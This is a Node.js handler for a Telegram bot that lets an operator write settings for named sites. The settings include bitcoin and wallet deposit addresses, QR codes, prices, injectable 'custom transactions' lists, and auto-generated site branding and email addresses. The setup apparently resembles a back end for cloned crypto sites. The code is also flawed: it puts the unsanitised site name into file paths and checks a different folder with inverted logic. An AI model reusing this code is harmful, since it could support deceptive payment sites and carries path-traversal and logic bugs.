const settings = require("../settings/settings.js");
const fs = require("fs");

function findAndDeleteById(arr, id) {
  const index = arr.findIndex(item => item.no === id);
  if (index !== -1) {
    arr.splice(index, 1); // Remove the found item
  }
  return arr;
}

function flattenArray(arr) {
  return arr.reduce((acc, item) => {
    if (Array.isArray(item)) {
      acc.push(...flattenArray(item)); // Recursively flatten
    } else {
      acc.push(item);
    }
    return acc;
  }, []);
}

module.exports.set_settings = (link, chatId, bot, step, site) => {
  let pathToFolder = `./assets/data/sites/${site}/`;
  const oldSettings = JSON.parse(fs.readFileSync(`${pathToFolder}settings.json`));
  const oldTransactionsData = JSON.parse(fs.readFileSync(`${pathToFolder}custom_transactions_settings.json`));

  fs.access(`../data/sites/${site}/`, function (error) {
    if (error) {
      switch (step) {
        case "qr":
          fs.writeFileSync(`${pathToFolder}qr_settings.json`, JSON.stringify({ qr_code_link: link }, null, "\t"));
          bot.sendMessage(chatId, `Excellent! The qr has been saved in site`);
          break;

        case "qr_deposit":
          fs.writeFileSync(`${pathToFolder}qr_deposit_settings.json`, JSON.stringify({ qr_code_link: link }, null, "\t"));
          bot.sendMessage(chatId, `Excellent! The qr deposit has been saved in site`);
          break;

        case "bitcoin_address":
          fs.writeFileSync(`${pathToFolder}bitcoin_address.json`, JSON.stringify({ bitcoin_address: link }, null, "\t"));
          bot.sendMessage(chatId, `Excellent! The bitcoin address has been saved in site`);
          break;

        case "full_wallet_address":
          fs.writeFileSync(`${pathToFolder}full_wallet_address_settings.json`, JSON.stringify({ full_wallet_address: link }, null, "\t"));
          bot.sendMessage(chatId, `Excellent! The full wallet address has been saved in site`);
          break;

        case "custom_transactions_settings":
          let custom_transactions_message = `Excellent! The transaction data has been saved in site`;
          if (oldTransactionsData && oldTransactionsData.length) {
            fs.writeFileSync(
              `${pathToFolder}custom_transactions_settings.json`,
              JSON.stringify([...oldTransactionsData, link], null, "\t")
            );
          } else {
            fs.writeFileSync(
              `${pathToFolder}custom_transactions_settings.json`,
              JSON.stringify([link], null, "\t")
            );
          }
          bot.sendMessage(chatId, custom_transactions_message);
          break;

        case "custom_transactions":
          let custom_transactions_message_ = `Excellent! The transactions data has been saved in site`;
          const flattenedLink = Array.isArray(link) ? flattenArray(link) : [link];
          if (oldTransactionsData && oldTransactionsData.length) {
            fs.writeFileSync(
              `${pathToFolder}custom_transactions_settings.json`,
              JSON.stringify([...oldTransactionsData, ...flattenedLink], null, "\t")
            );
          } else {
            fs.writeFileSync(
              `${pathToFolder}custom_transactions_settings.json`,
              JSON.stringify(flattenedLink, null, "\t")
            );
          }
          bot.sendMessage(chatId, custom_transactions_message_);
          break;

        case "delete_custom_transactions_settings":
          let delete_custom_transactions_message = `Excellent! The transaction data has been deleted from the site`;
          const newTransactionsArray = findAndDeleteById(oldTransactionsData, link);
          fs.writeFileSync(
            `${pathToFolder}custom_transactions_settings.json`,
            JSON.stringify(newTransactionsArray, null, "\t")
          );
          bot.sendMessage(chatId, delete_custom_transactions_message);
          break;

        case "price":
          fs.writeFileSync(`${pathToFolder}price_settings.json`, JSON.stringify({ price_euro: link }, null, "\t"));
          bot.sendMessage(chatId, `Excellent! The price has been saved in site`);
          break;

        case "address":
          fs.writeFileSync(`${pathToFolder}address_settings.json`, JSON.stringify({ address: link }, null, "\t"));
          bot.sendMessage(chatId, `Excellent! The address has been saved in site`);
          break;

        case "api-key":
          fs.writeFileSync(`${pathToFolder}api_key.json`, JSON.stringify({ api_key: link }, null, "\t"));
          bot.sendMessage(chatId, `Excellent! The api has been saved in site`);
          break;

        case "clear-users":
          fs.writeFileSync(`${pathToFolder}users-keys.json`, "[]");
          bot.sendMessage(chatId, `Excellent! The keys have been deleted`);
          break;

        case "set_replain_id":
          fs.writeFileSync(
            `${pathToFolder}settings.json`,
            JSON.stringify({ ...oldSettings, replainId: link }, null, "\t")
          );
          bot.sendMessage(chatId, `Excellent! The id has been saved`);
          break;

        case "commission_precent":
          fs.writeFileSync(
            `${pathToFolder}settings.json`,
            JSON.stringify({ ...oldSettings, commissionPrecent: link }, null, "\t")
          );
          bot.sendMessage(chatId, `Excellent! The percent has been saved`);
          break;

        case "additional-btc-price":
          const transaction_0 = link[0];
          const transaction_1 = link[1];
          const transaction_2 = link[2];
          fs.writeFileSync(
            `${pathToFolder}transactions_wallet.json`,
            JSON.stringify({ transaction_0, transaction_1, transaction_2 }, null, "\t")
          );
          bot.sendMessage(chatId, `Excellent! The wallet transactions have been saved`);
          break;

        case "site_name":
          const capitalizedWord = link.charAt(0).toUpperCase() + link.slice(1);
          const toLower = link.toLowerCase();
          const oldEmailSettings = JSON.parse(fs.readFileSync(`${pathToFolder}email_settings.json`));

          fs.writeFileSync(
            `${pathToFolder}settings.json`,
            JSON.stringify({ ...oldSettings, siteName: link }, null, "\t")
          );

          fs.writeFileSync(
            `${pathToFolder}phone_settings.json`,
            JSON.stringify({ from: capitalizedWord }, null, "\t")
          );

          fs.writeFileSync(
            `${pathToFolder}email_settings.json`,
            JSON.stringify(
              {
                ...oldEmailSettings,
                login: `info@${toLower}.com`,
                loginTwo: `support@${toLower}.com`,
                domain: capitalizedWord,
                text: capitalizedWord,
                domainHeader: capitalizedWord,
                domainLink: `https://${toLower}.com`,
                domainFooter: capitalizedWord,
              },
              null,
              "\t"
            )
          );

          bot.sendMessage(chatId, `Excellent! The siteName has been saved`);
          break;

        default:
          break;
      }
    } else {
      bot.sendMessage(chatId, "You have entered an invalid site, please try again");
    }
  });
};
